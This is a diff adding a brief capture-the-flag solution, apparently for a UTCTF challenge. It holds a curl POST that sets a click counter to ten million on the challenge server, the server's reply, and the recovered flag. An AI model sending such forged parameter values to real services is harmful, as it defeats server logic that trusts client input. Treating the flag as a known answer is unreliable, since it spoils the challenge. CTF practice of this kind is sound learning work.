@@ -1,0 +1,16 @@
+curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "count=10000000" http://betta.utctf.live:8138/click
+
+prog:
+$ curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "count=10000000" http://betta.utctf.live:8138/click
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    83  100    69  100    14    124     25 --:--:-- --:--:-- --:--:--   149{"flag":"Wow, you beat me. Congrats! utflag{y0u_cl1ck_pr3tty_f4st}"}
+
+
+
+flag: utflag{y0u_cl1ck_pr3tty_f4st}
+
+
+
+
+
